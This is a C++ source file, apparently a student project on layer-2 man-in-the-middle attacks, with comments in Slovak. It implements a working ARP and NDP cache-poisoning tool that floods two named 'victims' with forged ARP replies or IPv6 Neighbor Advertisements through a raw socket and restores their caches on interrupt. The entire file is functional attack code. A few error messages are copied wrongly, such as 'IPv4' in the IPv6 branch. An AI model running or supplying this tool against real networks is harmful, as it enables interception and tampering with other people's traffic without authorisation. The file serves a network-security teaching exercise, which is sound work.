// Projekt: PDS - L2 MitM
// Autor:   Daniel Klimaj; xklima22@stud.fit.vutbr.cz

#include <csignal>
#include <unistd.h>

#include "types.h"
#include "netitf.h"
#include "arppkt.h"
#include "socket.h"
#include "icmpv6pkt.h"

using namespace std;

///
/// \brief Priznak urcujuci, ci sa bude este pokracovat v zasielani paketov,
/// SIGINT ho nastavi na false
///
bool do_spoofing = true;

const uint US2MS = 1000;

void print_usage();
void on_sigint(int signum);
bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1,
    MACAddr *m2, uint interval);
bool spoof_ndp(NetItf *itf, IPv6Addr *ip1, IPv6Addr *ip2, MACAddr *m1,
    MACAddr *m2, uint interval);

int main(int argc, char **argv)
{
    bool all_ok = true;
    StrVect args;
    for(int i=0; i<argc; ++i)
        args.push_back(string(argv[i]));

    signal(SIGINT, on_sigint);

    string interface   = "";
    string interval    = "";
    string protocol    = "";
    string v1ip        = "";
    string v1mac       = "";
    string v2ip        = "";
    string v2mac       = "";
    uint   tm_interval = 0;

    if(args.size() != 15)
    {
        print_usage();
        return OP_FAIL;
    }

    // Spracovanie parametrov
    for(uint i=1; i<args.size(); i += 2)
    {
        if(args[i][0] == '-')
        {
            if     (args[i] == "-i")          interface = args[i+1];
            else if(args[i] == "-t")          interval  = args[i+1];
            else if(args[i] == "-p")          protocol  = args[i+1];
            else if(args[i] == "-victim1ip")  v1ip      = args[i+1];
            else if(args[i] == "-victim1mac") v1mac     = args[i+1];
            else if(args[i] == "-victim2ip")  v2ip      = args[i+1];
            else if(args[i] == "-victim2mac") v2mac     = args[i+1];
            else
            {
                cerr << "Unknown parameter " << args[i] << endl;
                print_usage();
                return OP_FAIL;
            }
        }
        else
        {
            print_usage();
            return OP_FAIL;
        }
    }

    // Kontrola parametrov
    if(protocol != "arp" && protocol != "ndp")
    {
        cerr << "Invalid protocol '" << protocol << "'" << endl;
        all_ok = false;
    }

    size_t ptr;
    tm_interval = stoi(interval, &ptr);
    if(ptr != interval.size())
    {
        cerr << "Invalid interval value '" << interval << "'" << endl;
        all_ok = false;
    }

    NetItf *netitf = new NetItf(interface);
    if(netitf->index() < OP_SUCC)
    {
        cerr << "Failed to find netinterface '" << interface << "'" << endl;
        all_ok = false;
    }

    IPVer v1ipv = IPAddr::get_version(v1ip);
    IPVer v2ipv = IPAddr::get_version(v2ip);
    if(v1ipv == IPVer::Undef || v2ipv == IPVer::Undef)
    {
        cerr << "Invalid IP address format" << endl;
        all_ok = false;
    }
    if(v1ipv != v2ipv)
    {
        cerr << "Different IP address versions" << endl;
        all_ok = false;
    }

    // Kontrola formatu adries
    IPv6Addr *v1ip6  = nullptr;
    IPv6Addr *v2ip6  = nullptr;
    IPv4Addr *v1ip4  = nullptr;
    IPv4Addr *v2ip4  = nullptr;
    MACAddr  *v1maca = nullptr;
    MACAddr  *v2maca = nullptr;

    if(v1ipv == IPVer::IPv4 && protocol == "arp")
    {
        v1ip4 = new IPv4Addr(v1ip);
        v2ip4 = new IPv4Addr(v2ip);
        if(v1ip4->empty())
        {
            cerr << "Invalid IPv4 address: " << v1ip << endl;
            all_ok = false;
        }
        if(v2ip4->empty())
        {
            cerr << "Invalid IPv4 address: " << v2ip << endl;
            all_ok = false;
        }
    }
    else if(v1ipv == IPVer::IPv6 && protocol == "ndp")
    {
        v1ip6 = new IPv6Addr(v1ip);
        v2ip6 = new IPv6Addr(v2ip);
        if(v1ip6->empty())
        {
            cerr << "Invalid IPv4 address: " << v1ip << endl;
            all_ok = false;
        }
        if(v2ip6->empty())
        {
            cerr << "Invalid IPv4 address: " << v2ip << endl;
            all_ok = false;
        }
    }
    else
    {
        cerr << "IP address version is incompatible with protocol" << endl;
        all_ok = false;
    }

    v1maca = new MACAddr(v1mac);
    v2maca = new MACAddr(v2mac);
    if(v1maca->empty())
    {
        cerr << "Invalid MAC address: " << v1mac << endl;
        all_ok = false;
    }
    if(v2maca->empty())
    {
        cerr << "Invalid MAC address: " << v2mac << endl;
        all_ok = false;
    }

    if(all_ok)
    {
        if(protocol == "arp")
        {
            if(!spoof_arp(netitf, v1ip4, v2ip4, v1maca, v2maca, tm_interval))
            {
                cerr << "ARP spoof failed" << endl;
                all_ok = false;
            }
        }
        else
        {
            if(!spoof_ndp(netitf, v1ip6, v2ip6, v1maca, v2maca, tm_interval))
            {
                cerr << "NDP spoof failed" << endl;
                all_ok = false;
            }
        }
    }

    if(v1ip6 != nullptr) delete v1ip6;
    if(v2ip6 != nullptr) delete v2ip6;
    if(v1ip4 != nullptr) delete v1ip4;
    if(v2ip4 != nullptr) delete v2ip4;
    delete v1maca;
    delete v2maca;
    delete netitf;
    return all_ok ? OP_SUCC : OP_FAIL;
}

///
/// \brief Vypise pouzitie programu
///
void print_usage()
{
    cout << "Usage: pds-spoof -i interface -t sec -p protocol " <<
        "-victim1ip ipaddress -victim1mac macaddress -victim2ip " <<
        "ipaddress -victim2mac macaddress" << endl;
}

///
/// \brief SIGINT handler
/// \param signum
///
void on_sigint(int signum)
{
    cout << " SIGINT(" << signum << ") detected" << endl;
    do_spoofing = false;
}

///
/// \brief Otravenie ARP cache
/// \param itf sietove rozhranie
/// \param ip1 IPv4 adresa obete 1
/// \param ip2 IPv4 adresa obete 2
/// \param m1 MAC  adresa obete 1
/// \param m2 MAC  adresa obete 2
/// \param interval v ms
/// \return
///
bool spoof_arp(NetItf *itf, IPv4Addr *ip1, IPv4Addr *ip2, MACAddr *m1,
MACAddr *m2, uint interval)
{
    Socket s(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(s.open() != SocketStatus::Opened)
    {
        cerr << "Failed to open socket for ARP spoofing" << endl;
        return false;
    }

    MACAddr *loc_mac = itf->mac();
    ArpPkt  *arppkt1 = new ArpPkt(ArpType::Response, ip2, loc_mac); // pre V1
    ArpPkt  *arppkt2 = new ArpPkt(ArpType::Response, ip1, loc_mac); // pre V2
    int      ifn     = itf->index();

    arppkt1->set_dst_hwa(m1);
    arppkt1->set_dst_ip_addr(ip1);
    arppkt2->set_dst_hwa(m2);
    arppkt2->set_dst_ip_addr(ip2);

    while(do_spoofing)
    {
        cout << "Sending ARP packets" << endl;
        s.send(arppkt1, ifn);
        s.send(arppkt2, ifn);
        usleep(interval * US2MS);
    }

    arppkt1->set_src_hwa(m2);
    arppkt2->set_src_hwa(m1);

    // Obnova povodneho stavu
    cout << "Restoring previous ARP status" << endl;
    s.send(arppkt1, ifn);
    s.send(arppkt2, ifn);

    s.close();
    delete arppkt1;
    delete arppkt2;
    return true;
}

///
/// \brief Otravenie ND cahce
/// \param itf sietove rozhranie
/// \param ip1 IPv6 adresa obete 1
/// \param ip2 IPv6 adresa obete 2
/// \param m1 MAC adresa obete 1
/// \param m2 MAC adresa obete 2
/// \param interval v ms
/// \return false pri chybe
///
bool spoof_ndp(NetItf *itf, IPv6Addr *ip1, IPv6Addr *ip2, MACAddr *m1,
MACAddr *m2, uint interval)
{
    Socket s(PF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
    if(s.open() != SocketStatus::Opened)
    {
        cerr << "Failed to open socket for ARP spoofing" << endl;
        return false;
    }

    MACAddr   *loc_mac = itf->mac();
    IcmpV6Pkt *na1     = new IcmpV6Pkt(IcmpV6Type::NA, ip2, loc_mac); // pre V1
    IcmpV6Pkt *na2     = new IcmpV6Pkt(IcmpV6Type::NA, ip1, loc_mac); // pre V2
    int        ifn     = itf->index();

    na1->set_dst_hwa(m1);
    na1->set_dst_ip_addr(ip1);
    na1->set_na_flag_override();
    na1->set_multicast_flag(false);
    na2->set_dst_hwa(m2);
    na2->set_dst_ip_addr(ip2);
    na2->set_na_flag_override();
    na2->set_multicast_flag(false);

    while(do_spoofing)
    {
        cout << "Sending NA packets" << endl;
        s.send(na1, ifn);
        s.send(na2, ifn);
        usleep(interval * US2MS);
    }

    na1->set_src_hwa(m2);
    na2->set_src_hwa(m1);
    // Obnova povodneho stavu
    cout << "Restoring previous ND status" << endl;
    s.send(na1, ifn);
    s.send(na2, ifn);

    s.close();
    delete na1;
    delete na2;
    return true;
}
